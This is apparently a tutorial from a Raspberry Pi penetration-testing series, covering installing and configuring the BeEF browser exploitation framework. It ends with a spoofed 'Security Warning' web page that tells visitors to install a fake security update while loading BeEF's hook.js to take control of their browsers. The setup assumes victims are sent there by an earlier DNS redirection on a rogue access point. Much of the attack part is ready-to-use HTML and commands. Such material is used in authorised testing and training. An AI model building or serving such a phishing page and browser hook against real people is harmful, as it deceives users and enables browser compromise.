# BeEF on Raspberry PI

BeEF (_Browser Exploitation Framework_) is a penetration tool focused on exploiting vulnerabilities inside web browsers.

## Objective

The aim of this tutorial is to set up BeEF on Raspberry PI and to show you where you could place the `hook.js`.

## Precondition

- [Setup Raspberry PI](../Setup)
- [Prepare Raspberry PI](../Preparation)
- [Wi-Fi Analysis](../WIFIAnalysis)
- [Simple Access Point](../AccessPoint)
- [DNS Analysis](../DNSAnalysis)
- [DNS Redirection](../DNSRedirection)

## Install needed and/or optional packages

Install (_or ensure they are installed_) following packages.

```shell
# update system (optional)
$ sudo apt update -y && sudo apt upgrade -y

# install optional packages (optional)
$ sudo apt install -y vim

# install needed packages
$ sudo apt install -y ruby-full curl git build-essential openssl libreadline6-dev zlib1g zlib1g-dev libssl-dev libyaml-dev libsqlite3-0 libsqlite3-dev sqlite3 libxml2-dev libxslt1-dev autoconf libc6-dev libncurses5-dev automake libtool bison nodejs libcurl4-openssl-dev
```

## BeEF

### Install BeEF

```shell
# changer into home directory
$ cd ~

# clone git repository
$ git clone https://github.com/beefproject/beef.git

# change into cloned repository directory
$ cd beef/

# modify install script
$ vim install
```

On line 106 are two packages which are not available `gcc-9-base` and `libgcc-9-dev`. You must remove them from the file `/home/pi/beef/install`! If you have already installed all packages, you can comment this line.

```shell
...
if [ "${Distro}" = "Debian" ] || [ "${Distro}" = "Kali" ]; then
   sudo apt-get update
   # sudo apt-get install curl git build-essential openssl libreadline6-dev zlib1g zlib1g-dev libssl-dev libyaml-dev libsqlite3-0 libsqlite3-dev sqlite3 libxml2-dev libxslt1-dev autoconf libc6-dev libncurses5-dev automake libtool bison nodejs libcurl4-openssl-dev gcc-9-base libgcc-9-dev
...
```

To save a lot of time, you can add `--no-document` into command `sudo gem${RUBYSUFFIX} update --system` on line 205.

### Configure BeEF

Just change username and password on `/home/pi/beef/config.yaml`.

```shell
# modify config.yaml
$ vim config.yaml
```

Read this [Wiki](https://github.com/beefproject/beef/wiki/Configuration) for more information's.

### Start BeEF

```shell
# start BeEF
$ ./beef
```

Open in your browser the URL `http://192.168.0.1:3000/ui/panel` and login with your credentials (_you have modified in the config.yaml_). [Here](https://github.com/beefproject/beef/wiki/Interface) you will find a detailed description. 

_Note: If you follow the output inside the terminal, you will see that some other packages are required. Install them if you need them (maybe in second terminal session) and execute the BeEF command again (inside the Browser UI)._

### Test BeEF local

You can also test BeEF locally, but be careful!

```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>local test of BeEF</title>
</head>
<body>
  <p>This is my local test site...</p>
  <script src="http://[your ip of wlan0 interface]:3000/hook.js"></script>
</body>
</html>
```

## Prepare the spoofed domain web page

Now we place the `hook.js` inside the fake page.

Content of file `/var/www/html/index.html`.

```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Security Warning - with security update</title>
  <link type="text/css" rel="stylesheet" href="styles/style.css">
</head>
<body>
  <div id="warning">
    <h1>Security Warning</h1>
    <p>We have detected a serious security problem,<br /> 
       please install now the free security update!</p>
  </div>
  <div id="patch">
    <span><!-- placeholder security update --></span>
  </div>
  <script type="text/javascript" src="scripts/script.js"></script>
  <script src="http://192.168.0.1:3000/hook.js"></script>
</body>
</html>
```

## Additional

If the client has JavaScript disabled, this attack will not work.

[Go Back](../readme.md)
